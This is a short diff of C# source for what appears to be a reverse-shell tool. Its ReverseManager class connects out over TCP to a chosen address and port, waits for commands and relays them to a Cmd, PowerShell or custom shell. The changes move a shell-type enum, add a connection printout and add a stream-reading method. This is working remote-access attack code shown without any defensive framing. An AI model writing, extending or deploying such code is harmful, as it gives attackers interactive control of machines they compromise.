@@ -7,17 +7,10 @@ using System.Net;
 using System.Net.Sockets;
 using System.IO;
 using System.Diagnostics;
+using Enums;
 
 namespace ISBD
 {
-    public enum ShellType
-    {
-        LovelyDay,
-        Cmd,
-        PowerShell,
-        Custom
-    }
-
     public static class ReverseManager
     {
         private static TcpClient ourClient;
@@ -30,6 +23,7 @@ namespace ISBD
         {
             ourClient = new TcpClient();
             ourClient.Connect(aReverseAddress, aPort);
+            Console.Write("Connected to: {0}:{1}", aReverseAddress, aPort);
             ourNetworkStream = ourClient.GetStream();
             ourStreamReader = new StreamReader(ourNetworkStream);
             ourStreamWriter = new StreamWriter(ourNetworkStream);
@@ -40,6 +34,11 @@ namespace ISBD
         public static void WriteStream(string someData)
         {
             ourShell.WriteStream(someData);
+        }
+
+        public static string ReadStream()
+        {
+            return ourShell.ReadStream();
         }
 
         public static string WaitForCommand()
